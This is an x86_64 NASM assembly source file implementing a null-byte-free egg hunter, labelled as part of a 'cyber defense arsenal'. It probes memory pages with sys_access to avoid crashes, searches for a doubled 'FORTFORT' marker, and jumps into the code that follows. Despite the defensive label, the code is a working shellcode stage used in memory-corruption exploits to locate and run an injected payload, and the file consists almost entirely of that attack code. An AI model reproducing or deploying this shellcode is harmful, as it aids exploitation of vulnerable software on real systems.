; ==============================================================================
; FORTRESS ADVANCED CYBER DEFENSE ARSENAL (TAB 30)
; File: egghunter_trap.asm
; Target Architecture: Linux x86_64 (AMD64 / Intel 64)
; Assembler: NASM (Intel Syntax)
; Calling Convention: System V AMD64 ABI
; Purpose: 64-bit Memory Egg Hunter with Kernel sys_access Page Validation,
;          Zero-Crash Virtual Memory Scanning, and Canary Counter-Payload Execution.
; ==============================================================================

BITS 64
DEFAULT REL

section .text
global _start
global egg_hunter_search

; Unique 8-Byte Egg Marker: "FORTFORT" (0x54524F4654524F46)
; In memory, the payload will be prefixed with TWO consecutive markers:
; "FORTFORTFORTFORT" (16 bytes) to prevent the egg hunter from matching itself.
%define EGG_MARKER 0x54524F4654524F46

; ------------------------------------------------------------------------------
; Entry Point: _start / egg_hunter_search
; 100% NULL-BYTE FREE 64-bit Egg Hunter implementation
; Safely scans user-space address space using sys_access (rax=21)
; to validate memory pages before dereferencing pointers.
; ------------------------------------------------------------------------------
_start:
egg_hunter_search:
    ; Initialize base search register (align to 4KB page)
    xor rbx, rbx                    ; RBX = 0x0000000000000000 (Start from base virtual address)

.next_page:
    ; Advance to next 4096-byte memory page
    or bx, 0x0fff                   ; Align to page boundary - 1
    inc rbx                         ; RBX = page base (0x...000)

.check_page:
    ; Query kernel to verify if address at [RBX] is mapped into process space.
    ; sys_access(const char *pathname, int mode)
    ;   RAX = 21 (sys_access)
    ;   RDI = RBX (Pointer to address to test)
    ;   RSI = 0  (F_OK - test existence)
    mov rdi, rbx                    ; RDI = memory address to test
    xor rsi, rsi                    ; RSI = 0
    xor rax, rax
    mov al, 21                      ; RAX = 21 (sys_access)
    syscall

    ; Evaluate kernel return value in RAX:
    ;   If page is unmapped: RAX = -14 (0xFFFFFFFFFFFFFFF2, -EFAULT)
    ;   If page is mapped: RAX = -2 (-ENOENT) or 0 (success)
    cmp al, 0xf2                    ; Check if lower byte matches -EFAULT (0xF2)
    je .next_page                   ; Page is invalid -> skip entire 4096-byte page!

    ; --- Page is Valid & Safe to Read ---
    ; Prepare egg search target
    mov r12, EGG_MARKER             ; R12 = "FORTFORT" (0x54524F4654524F46)

.scan_bytes:
    ; Compare 8 bytes at [RBX] with Egg Marker
    cmp qword [rbx], r12
    jne .increment_search

    ; First 8-byte tag matched! Now check subsequent 8 bytes for confirmation:
    cmp qword [rbx + 8], r12
    jne .increment_search

    ; --- DOUBLE EGG MATCHED! ---
    ; RBX points to the 16-byte egg preamble.
    ; Real payload begins immediately at [RBX + 16].
    lea rdi, [rbx + 16]             ; RDI = pointer to counter-payload
    
    ; Jump to the discovered payload
    jmp rdi

.increment_search:
    inc rbx                         ; Advance 1 byte
    ; Check if we have crossed into the next page
    test bx, 0x0fff
    jz .check_page                  ; Boundary reached -> re-validate page access
    jmp .scan_bytes                 ; Continue searching within mapped page
